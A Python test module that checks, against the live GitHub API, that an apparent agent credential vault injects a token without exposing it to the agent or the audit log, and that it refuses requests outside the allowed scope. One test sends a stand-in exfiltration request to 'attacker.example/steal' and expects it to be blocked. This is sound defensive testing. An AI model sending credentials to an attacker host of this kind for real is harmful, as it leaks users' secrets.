"""Live end-to-end test against the real GitHub API.

Opt-in and offline-safe: the whole module is skipped unless
AGENT_KEYCHAIN_E2E_GITHUB_TOKEN holds a GitHub token, so CI and ordinary
test runs make no network calls. To run it:

    AGENT_KEYCHAIN_E2E_GITHUB_TOKEN=$(gh auth token) pytest tests/test_live_github.py -v

This proves the one thing the offline suite argues only structurally: with a
real credential and a real network round trip through the full stack --
server policy gauntlet -> isolated subprocess -> api.github.com -> response
DLP -> agent-visible return value -- the secret appears nowhere the agent
can see. GET /user is used as the probe because it rejects unauthenticated
requests, so a 200 is positive proof the token really was injected.

Hygiene: the token is read from the environment only, stored under a
throwaway name, and deleted in teardown. Every assertion carries a custom
message so a failure never embeds response or log content -- test output
cannot leak the token even when the test fails.
"""

import json
import os

import pytest

from agent_keychain.audit import audit_log
from agent_keychain.mcp_server.server import (
    vault,
    secure_http_request,
    list_available_credentials,
)

TOKEN = os.environ.get("AGENT_KEYCHAIN_E2E_GITHUB_TOKEN", "")
CRED = "live-e2e-github"

pytestmark = pytest.mark.skipif(
    not TOKEN,
    reason="live E2E is opt-in: set AGENT_KEYCHAIN_E2E_GITHUB_TOKEN to a GitHub token",
)


@pytest.fixture(autouse=True)
def isolated_audit_log(tmp_path, monkeypatch):
    """Route audit writes to a throwaway file we can inspect."""
    path = tmp_path / "audit.jsonl"
    monkeypatch.setenv("AGENT_KEYCHAIN_AUDIT_LOG", str(path))
    return path


@pytest.fixture
def live_credential():
    """Store the real token least-privilege; guarantee deletion afterwards."""
    vault.store(
        CRED,
        TOKEN,
        "github",
        description="live E2E test credential",
        allowed_domains=["github.com"],
        allowed_methods=["GET"],
        allowed_paths=["/user"],
    )
    try:
        yield
    finally:
        vault.delete(CRED)


def test_live_round_trip_exposes_no_credential(live_credential, isolated_audit_log):
    result = secure_http_request(CRED, "https://api.github.com/user", method="GET")

    # The request really happened and really authenticated: GET /user
    # returns 401 without a valid token, so a 200 proves injection worked.
    assert "Status: 200" in result, "expected an authenticated 200 from GET /user (content withheld)"

    # The claim under test: the secret is absent from everything the agent sees.
    assert TOKEN not in result, "token leaked into the agent-visible response (content withheld)"
    assert TOKEN not in list_available_credentials(), "token leaked via credential listing"

    # ... and from what the audit trail persists.
    audit_text = isolated_audit_log.read_text()
    assert TOKEN not in audit_text, "token leaked into the audit log (content withheld)"

    events = [json.loads(line) for line in audit_text.splitlines()]
    assert any(
        e["credential"] == CRED
        and e["host"] == "api.github.com"
        and e["decision"] == audit_log.ALLOWED
        for e in events
    ), "expected an allowed audit record for the live request"


def test_live_credential_is_still_scoped(live_credential):
    """The policy gauntlet keeps holding with a real token in the vault.

    Both requests are refused before any subprocess or network call.
    """
    out_of_scope = secure_http_request(CRED, "https://api.github.com/user/keys")
    assert "not allowed" in out_of_scope, "path outside scope was not refused"
    assert TOKEN not in out_of_scope, "token leaked into a refusal message"

    exfil = secure_http_request(CRED, "https://attacker.example/steal")
    assert "not allowed" in exfil, "off-domain exfil was not refused"
    assert TOKEN not in exfil, "token leaked into a refusal message"
